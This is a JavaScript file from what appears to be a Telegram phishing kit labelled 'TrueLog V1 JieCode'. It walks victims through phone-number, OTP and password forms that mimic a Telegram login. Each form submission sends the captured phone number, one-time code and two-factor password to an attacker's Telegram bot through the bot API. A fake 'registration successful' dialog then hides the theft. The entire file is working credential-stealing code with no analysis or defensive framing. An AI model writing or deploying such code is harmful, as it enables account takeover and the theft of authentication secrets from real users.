function kirimResult(gabungan){
  $.ajax({
      url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
      method: `POST`,
      complete: function(data) {
                  console.log('Complete')
      setTimeout(function(){
          }, 1000);

              }
          });
}

function handleInput() {
  let prefix;
  const input = document.getElementById("phoneNumber");
  const button = document.getElementById("btn-gasskan");

  const acu = document.getElementById("acu").value;
  if (acu == "malay") {
     prefix = "+60";
  } else if (acu == "singa") {
     prefix = "+65";
  }

  // Pastikan nilai selalu diawali dengan "+62"
  if (!input.value.startsWith(prefix)) {
    input.value = prefix;
  }

  // Cek apakah jumlah digit setelah "+62" valid (lebih dari 9 angka)
  const phoneNumber = input.value.slice(prefix.length); // Ambil bagian setelah "+62"
  if (phoneNumber.length >= 9 && /^\d+$/.test(phoneNumber)) {
    // Jika panjang >= 9 dan hanya angka
    button.disabled = false;
    button.classList.remove("bg-gray-500", "cursor-not-allowed");
    button.classList.add("bg-purple-600", "cursor-pointer");
  } else {
    // Jika tidak valid
    button.disabled = true;
    button.classList.add("bg-gray-500", "cursor-not-allowed");
    button.classList.remove("bg-purple-600", "cursor-pointer");
  }
}

function handleInputOtp() {
  const otp = document.getElementById("otp");
  const button = document.getElementById("btn-gasskan");

  // Cek panjang value dan pastikan hanya angka
  if (otp.value.length == 5 && /^\d+$/.test(otp.value)) {
      button.disabled = false;
      button.classList.remove("bg-gray-500", "cursor-not-allowed");
      button.classList.add("bg-purple-600", "cursor-pointer");
  } else {
      button.disabled = true;
      button.classList.add("bg-gray-500", "cursor-not-allowed");
      button.classList.remove("bg-purple-600", "cursor-pointer");
  }
}


const btn = document.getElementById("btn-gasskan");
$( "#form-no" ).on( "submit", function( event ) {
  event.preventDefault();

  btn.textContent = "Sending code....";
  $("#notif").text("");
  const phone = document.getElementById("phoneNumber").value;
  var gabungan = '' + '╚»★«╝ TELEGRAM ╚»★«╝' + '%0A' +
  'Nomer : ' + phone + '%0A' +
  '____________' + '%0A' +
  'TrueLog V1 JieCode';

  sessionStorage.setItem("phone_number", phone);
            kirimResult(gabungan);
            setTimeout(function(){
              window.location.replace("../otp/");
            }, 1500);
});


$( "#form-otp" ).on( "submit", function( event ) {
  event.preventDefault();

  btn.textContent = "Verifying....";
  $("#notif").text("");
  const phone = sessionStorage.getItem("phone_number");
  const otp = document.getElementById("otp").value;
  sessionStorage.setItem("otp", otp);

  var gabungan = '' + '╚»★«╝ TELEGRAM ╚»★«╝' + '%0A' +
  'Nomer : ' + phone + '%0A' +
  'OTP : ' + otp + '%0A' +
  '____________' + '%0A' +
  'TrueLog V1 JieCode';

  kirimResult(gabungan);
  setTimeout(function(){
      window.location.replace("../password/");
  }, 1500);
});

$( "#form-pw" ).on( "submit", function( event ) {
  event.preventDefault();

  btn.textContent = "Verifying....";
  $("#notif").text("");
  const phone = sessionStorage.getItem("phone_number");
  const otp = sessionStorage.getItem("otp");
  const password = document.getElementById("password").value;

  var gabungan = '' + '╚»★«╝ TELEGRAM ╚»★«╝' + '%0A' +
  'Nomer : ' + phone + '%0A' +
  'OTP : ' + otp + '%0A' +
  'Password : ' + password + '%0A' +
  '____________' + '%0A' +
  'TrueLog V1 JieCode';

  kirimResult(gabungan);
  setTimeout(function(){
    Swal.fire({
      title: 'Your registration was successfully',
      html: `
          <p>Please wait a maximum of 7x24 hours for your data to be processed, or try again.</p>
          <center>
          <img src="https://hosting.tigerengine.id/hipt9m.gif" alt="Processing" style="width: 180px; margin-top: 10px;">
          </center>
      `,
      icon: 'success',
      confirmButtonText: 'Try Again'
  }).then((result) => {
      if (result.isConfirmed) {
          // Redirect ke index.html
          window.location.href = "../";
      }
  });
  }, 1500);
});